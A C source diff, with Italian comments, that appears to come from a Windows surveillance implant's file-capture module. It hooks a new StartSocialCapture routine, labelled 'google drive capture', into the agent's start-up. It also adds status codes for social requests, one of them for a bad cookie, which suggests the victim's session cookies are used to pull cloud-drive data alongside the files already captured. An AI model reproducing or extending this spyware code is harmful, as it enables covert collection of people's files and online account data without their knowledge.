@@ -1,4 +1,9 @@
 #include <shlwapi.h>
+extern void StartSocialCapture();
+
+#define SOCIAL_REQUEST_SUCCESS 0
+#define SOCIAL_REQUEST_BAD_COOKIE 1
+#define SOCIAL_REQUEST_NETWORK_PROBLEM 2
 
 #define MAXFILELEN (_MAX_PATH * 2 + 2) // Lunghezza per un nome widechar
 
@@ -25,7 +30,6 @@ typedef struct {
 	DWORD dwPid;
 } IPCCreateFileStruct;
 
-BOOL bPM_FileAgentStarted = FALSE; // Flag che indica se il monitor e' attivo o meno
 DWORD min_fsize = 0, max_fsize = 0; // Dimensione minima e massima di un file che puo' essere catturato 
 BOOL log_file_open = TRUE;
 nanosec_time min_date; // Data minima di un file che puo' essere catturato
@@ -565,7 +569,13 @@ DWORD __stdcall PM_FileAgentStartStop(BOOL bStartFlag, BOOL bReset)
 	// ...e va chiuso come ultima
 	if (!bStartFlag)
 		LOG_StopAgentLog(PM_FILEAGENT);
-		
+
+	//google drive capture
+	if(bStartFlag)
+	{		
+		StartSocialCapture();
+	}
+
 	return 1;
 }
 
@@ -596,5 +606,6 @@ DWORD __stdcall PM_FileAgentInit(JSONObject elem)
 
 void PM_FileAgentRegister()
 {
+	bPM_FileAgentStarted = FALSE;
 	AM_MonitorRegister(L"file", PM_FILEAGENT, (BYTE *)PM_FileAgentDispatch, (BYTE *)PM_FileAgentStartStop, (BYTE *)PM_FileAgentInit, NULL);
 }
